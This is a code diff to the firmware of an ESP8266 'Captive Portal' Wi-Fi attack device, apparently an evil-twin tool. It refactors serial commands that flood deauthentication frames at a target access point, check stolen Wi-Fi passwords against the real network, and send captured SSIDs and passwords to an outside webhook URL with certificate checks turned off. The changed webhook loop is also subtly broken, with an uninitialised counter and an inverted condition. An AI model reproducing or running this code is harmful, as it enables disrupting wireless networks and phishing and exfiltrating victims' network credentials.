@@ -1,7 +1,7 @@
-////////////////////////////////////////////////////
-//              Made By HEINZGUENTER              //
-// github.com/heinzguenter/ESP8266-Captive-Portal //
-////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////
+//                  Made By HEINZGUENTER                  //
+// https://github.com/heinzguenter/ESP8266-Captive-Portal //
+//////////////////////////////////////////////////////////// 
 
 #include <SoftwareSerial.h>
 #include <ESP8266WiFi.h>
@@ -30,42 +30,31 @@ void serialCommand(){
     }
   }
 
-  if(readString.length() > 0){
-    String command = splitReadString();
-    
-    if(command == "deauth"){
-      int channel = splitReadString().toInt();
+  if(readString.length() < 1){ return; }
+  Serial.printf("Communicate: %s\n", readString.c_str());
 
-      String mac = splitReadString();
+  String command = splitReadString();
 
-      deauth(channel, mac);
-    }
+  if(command == "webhook"){
+    String url; String ssid; String pass;
 
-    if(command == "webhook"){
-      String url; String ssid; String pass;
+    while (!esp.available()) { delay(1); }
+    while (esp.available()) { delay(3); char c = esp.read(); url += c; }
 
-      while (!esp.available()) { delay(1); }
-      while (esp.available()) { delay(3); char c = esp.read(); url += c; }
+    while (!esp.available()) { delay(1); }
+    while (esp.available()) { delay(3); char c = esp.read(); ssid += c; }
 
-      while (!esp.available()) { delay(1); }
-      while (esp.available()) { delay(3); char c = esp.read(); ssid += c; }
+    while (!esp.available()) { delay(1); }
+    while (esp.available()) { delay(3); char c = esp.read(); pass += c; }
 
-      while (!esp.available()) { delay(1); }
-      while (esp.available()) { delay(3); char c = esp.read(); pass += c; }
-
-      sendWebhook(url, ssid, pass);
-    }
-
-    if(command == "validate"){
-      String targetSSID = splitReadString();
-
-      String pass = splitReadString();
-
-      validate(targetSSID, pass);
-    }
-
-    if(command == "stopDeauthing"){ deauthing = false; }
+    sendWebhook(url, ssid, pass);
   }
+
+  if(command == "deauth"){ deauth(splitReadString().toInt(), splitReadString()); }
+
+  if(command == "stopDeauthing"){ deauthing = false; }
+
+  if(command == "validate"){ validate(splitReadString(), splitReadString()); }    
 }
 
 void deauth(const int channel, String BSSIDstr){
@@ -90,11 +79,11 @@ void deauth(const int channel, String BSSIDstr){
   
   if (channel != WiFi.channel()){ wifi_set_channel(channel); delay(100); } //switch to the channel of the network that we want to deauth
 
-  int i; digitalWrite(D4, LOW); //enable the deauting LED
+  digitalWrite(D4, LOW); //enable the deauting LED
   while(deauthing == true && WiFi.status() != 3) {
     serialCommand(); //check if other commands are beeing send over serial
     wifi_send_pkt_freedom(deauthPacket, 26, 0); //send the deauthing package
-    delay(10); i++;
+    delay(10);
   }
   digitalWrite(D4, HIGH); //disable de deauthing LED
 }
@@ -113,26 +102,26 @@ void sendWebhook(const String url, const String ssid, const String pass) {
   WiFiClientSecure client; HTTPClient https;
   int httpCode = 255;
 
-  if (client) {
-    client.setInsecure(); //Disable SSL certificate verification
+  if (!client) { esp.printf("Webhook client didnt properly start!"); return; }
+  
+  client.setInsecure(); //Disable SSL certificate verification
     
-    if (https.begin(client, url)){
-      https.addHeader("Content-Type", "application/json"); //Set request as JSON
+  if (https.begin(client, url)){
+    https.addHeader("Content-Type", "application/json"); //Set request as JSON
 
-      int i;
-      while (httpCode != 200 || i > 5){ //send post request until http code is 200
-        httpCode = https.POST("{'ssid':'" + ssid + "','pass':" + pass + "}"); //send post request
-        esp.printf("Webhook HTTP code %i\n\n", httpCode);
-        delay(500); i++;
-      }
-      
-      if (httpCode == 200 || i > 5) { https.end(); } //ifrequest is send successfully stop the http client
+    for (int i; i > 5 && httpCode != 200; i++){ //send post request until http code is 200
+      httpCode = https.POST("{'ssid':'" + ssid + "','pass':" + pass + "}"); //send post request
+      esp.printf("Webhook HTTP code %i\n\n", httpCode);
+      delay(500); i++;
     }
+
+    https.end(); //if request is send successfully stop the http client
   }
 }
 
 void setup() {
   esp.begin(115200);
+  Serial.begin(115200);
 
   WiFi.mode(WIFI_STA); WiFi.disconnect(); //setting up the wifi
   pinMode(D4, OUTPUT); digitalWrite(D4, HIGH); //setting up the deauthing LED
@@ -142,6 +131,6 @@ void setup() {
 void loop() {
   serialCommand(); //check for commands over serial
 
-  if(WiFi.status() == 3 && digitalRead(D3) == LOW) { digitalWrite(D3, HIGH); } //if conected and the LED is off turn it on
-  else if(WiFi.status() != 3 && digitalRead(D3) == HIGH){ digitalWrite(D3, LOW); } //if the LED is on but the ESP is not connected turn it of
+  if(WiFi.status() == 3 && digitalRead(D3) == LOW) { digitalWrite(D3, HIGH); } //if conected and the LED is off, turn it on
+  else if(WiFi.status() != 3 && digitalRead(D3) == HIGH){ digitalWrite(D3, LOW); } //if the LED is on but the ESP is not connected, turn it of
 }
